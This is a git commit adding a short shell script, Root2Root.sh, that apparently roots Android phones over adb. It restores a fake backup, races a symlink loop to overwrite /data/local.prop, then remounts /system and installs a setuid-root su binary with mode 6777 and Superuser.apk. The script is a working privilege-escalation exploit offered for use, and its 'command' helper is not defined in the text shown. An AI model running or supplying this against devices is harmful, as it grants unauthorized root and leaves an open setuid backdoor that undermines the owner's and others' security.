19602141866a92dcf38f0d530b520c04bcd0ddfb
Prasico <139031844+Prasico@users.noreply.github.com>
2024-01-07 20:16:16 +0530

    Add files via upload

---
+++ Root2Root.sh
@@ -0,0 +1,18 @@
+adb restore modules/fakebackup.ab
+
+  command "while ! ln -s /data/local.prop /data/data/com.android.settings/a/file99 2>/dev/null; do :; done; echo 'Overwrote local.prop!';"
+
+if command "cat /data/local.prop"
+	then echo "Succesfully rooted!"
+	echo "Requires a reboot..."
+	adb reboot
+	sleep 2
+	adb wait-for-device
+	command "mount -o rw,remount /system"
+	adb push /su-static /system/xbin/su
+	command "/data/local/tmp/busybox chown 0:0 /system/xbin/su"
+	command "/data/local/tmp/busybox chmod 6777 /system/xbin/su"
+	adb push /Superuser.apk /system/app/
+	command "rm /data/local.prop"
+	adb reboot
+fi
